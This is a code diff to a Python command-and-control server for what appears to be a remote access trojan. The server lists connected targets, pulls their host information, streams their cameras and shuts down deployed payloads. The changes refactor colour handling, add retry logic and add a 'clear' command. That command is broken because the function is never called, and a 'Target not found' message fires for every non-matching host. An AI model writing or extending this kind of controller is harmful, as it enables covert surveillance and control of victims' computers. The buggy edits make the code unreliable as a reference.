@@ -8,8 +8,9 @@ import json
 import sys
 import os
 from configparser import ConfigParser
-
-
+from assets.colors import colors as CR
+from colorama import init
+init()
 
 #msg [pls don't change anything from this msg]
 JSON_MSG_START_STREAM = {
@@ -27,6 +28,7 @@ INFO_MSG = {
 SHUTDOWN_MSG = {
     "command" : "stop connection"
 }
+"""
 class colors (object):
     def red():
         return colorama.Fore.RED
@@ -42,6 +44,7 @@ class colors (object):
         return colorama.Fore.BLACK
 
 CR = colors #init the colors class
+"""
 Splus = f"{CR.red()}|<{CR.green()}+{CR.red()}>|{CR.white()}"
 Sminess = f"{CR.red()}|<{CR.yellow()}-{CR.red()}>|{CR.white()}"
 Swarning = f"{CR.red()}<|{CR.yellow()}!{CR.red()}>|{CR.white()}"
@@ -89,14 +92,25 @@ def help(TYPE):
         print(HELP_TABLE)
 
 def recv_target_info(target):
-    DATA = target.recv(99999).decode()
-    if json.loads(DATA):
-        with open(f"target_info/{target.getsockname()[0]}.json", "w") as info_save:
-            json.dump(json.loads(DATA), info_save, indent=6)
-        info_save.close()
-        with open(f"target_info/{target.getsockname()[0]}.json", "r") as info:
-            for x, y in enumerate(dict(json.load(info)).items()):
-                print(f"{' '*7}{CR.green()} {y[0]}{CR.yellow()} --> {CR.blue()}{y[1]}{CR.white()}")
+    while True:
+        try:
+            DATA = target.recv(99999).decode()
+            if json.loads(DATA):
+                with open(f"target_info/{target.getsockname()[0]}.json", "w") as info_save:
+                    json.dump(json.loads(DATA), info_save, indent=6)
+                info_save.close()
+                with open(f"target_info/{target.getsockname()[0]}.json", "r") as info:
+                    for x, y in enumerate(dict(json.load(info)).items()):
+                        print(f"{' '*7}{CR.green()} {y[0]}{CR.yellow()} --> {CR.blue()}{y[1]}{CR.white()}")
+            break
+        except Exception:
+            pass
+
+def clear_screen():
+    try:
+        os.system("cls")
+    except:
+        os.system("clear")
 
 def StartCameraStreamingServer(host, port):
     global CAMERA_STREAMING    
@@ -150,6 +164,8 @@ def connect_with_host(target_add):
             elif COMMAND_FOR_TARGET_SESSION == "get info":
                 target_add.send(json.dumps(INFO_MSG).encode())
                 recv_target_info(target=target_add)
+            elif COMMAND_FOR_TARGET_SESSION == "clear":
+                clear_screen
             elif COMMAND_FOR_TARGET_SESSION == "back to main":
                 if SERVER_UP:
                     print(f"\r{Swarning} {CR.green()}Stoping the stream recv...", end="")
@@ -190,6 +206,8 @@ def run():
                     for x in TARGETS:
                         if x.getsockname()[0] == THE_ADDR:
                             connect_with_host(target_add=x)
+                        else:
+                            print(f"{Sminess} {CR.red()}Target not found{CR.white()}")
                 else:
                     print(f"{Sminess} {CR.red()}Target not specified{CR.white()}")
             elif COMMAND_INPUT == "help":
@@ -205,6 +223,8 @@ def run():
                         pass
                     os.system("rm server/setting/CS-config.ini")
                     x.shutdown(socket.SHUT_RDWR);server.close(); time.sleep(1); sys.exit() #just to make sure all the targets that are connected close the connection and shuting the payloads down
+            elif COMMAND_INPUT == "clear":
+                clear_screen
         except KeyboardInterrupt:
             print(f"{Splus} {CR.green()} User interrupt {CR.yellow()}[CTRL+C]{CR.green()}exiting...")
             for x in TARGETS:
@@ -215,6 +235,7 @@ def run():
                     print(f"{CR.blue()}OK{CR.white()}")
                 except:
                     pass
+            os.system("rm server/setting/CS-config.ini")
             x.shutdown(socket.SHUT_RDWR);server.close(); time.sleep(1); sys.exit()
 
-run()
+#run()
